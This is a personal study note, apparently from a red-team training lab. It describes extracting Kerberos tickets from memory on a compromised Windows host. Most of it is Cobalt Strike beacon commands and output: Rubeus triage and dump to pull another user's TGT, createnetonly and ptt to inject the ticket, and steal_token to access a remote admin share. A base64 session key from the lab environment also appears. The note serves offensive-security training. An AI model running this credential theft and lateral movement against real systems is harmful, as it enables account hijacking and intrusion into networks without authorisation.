---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Extracting Kerberos Tickets]]  
___

## Description:  
Instead of using the NTLM hash or AES keys to request a TGT for the user, we can actually extract their TGTs directly from memory if they're logged onto a machine we control. Rubeus `triage` will list the Kerberos tickets in all the logon sessions currently on a system (if not elevated, it can only show tickets in your own logon session).

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e7

 ------------------------------------------------------------------------------------------------------------------ 
 | LUID    | UserName                     | Service                                       | EndTime               |
 ------------------------------------------------------------------------------------------------------------------ 
 | 0x462eb | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 5/12/2021 12:34:03 AM |
 | 0x25ff6 | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 5/12/2021 12:33:41 AM |
 ------------------------------------------------------------------------------------------------------------------
```

jking has a logon session with LUID **0x462eb** and the **krbtgt** service means that this is a TGT. To extract it from memory, use Rubeus **dump**.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap

[*] Target service  : krbtgt
[*] Target LUID     : 0x462eb
[*] Current LUID    : 0x3e7

  UserName                 : jking
  Domain                   : DEV
  LogonId                  : 0x462eb
  UserSID                  : S-1-5-21-3263068140-2042698922-2891547269-1122
  AuthenticationPackage    : Kerberos
  LogonType                : Interactive
  LogonTime                : 5/11/2021 2:34:03 PM
  LogonServer              : DC-2
  LogonServerDNSDomain     : DEV.CYBERBOTIC.IO
  UserPrincipalName        : jking@dev.cyberbotic.io

    ServiceName           :  krbtgt/DEV.CYBERBOTIC.IO
    ServiceRealm          :  DEV.CYBERBOTIC.IO
    UserName              :  jking
    UserRealm             :  DEV.CYBERBOTIC.IO
    StartTime             :  5/11/2021 2:34:03 PM
    EndTime               :  5/12/2021 12:34:03 AM
    RenewTill             :  5/18/2021 2:34:03 PM
    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  oh0gqFF8D81ijGlce+jyc0yMtHYaDrl8AM0b4+BqO8E=
    Base64EncodedTicket   :

      [...ticket...]
```

Create a sacrificial logon session with `createnetonly` and take note of both the new **LUID** and **ProcessID**.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

[*] Action: Create Process (/netonly)
[*] Showing process : False
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4872
[+] LUID            : 0x92a8c
```

Now use `ptt` to pass the extracted TGT into the sacrificial logon session using the `/luid` flag.
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]

[*] Action: Import Ticket
[*] Target LUID: 0x92a8c
[+] Ticket successfully imported!
```

Steal the access token of that process and access the target resource.

```
beacon> steal_token 4872
[+] Impersonated NT AUTHORITY\SYSTEM

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     05/06/2021 09:49:35   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     05/10/2021 09:52:08   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/29/2021 12:15:45   System Volume Information
          dir     02/17/2021 18:32:08   Users
          dir     05/06/2021 09:50:19   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     05/11/2021 13:17:32   pagefile.sys
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (05:01 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
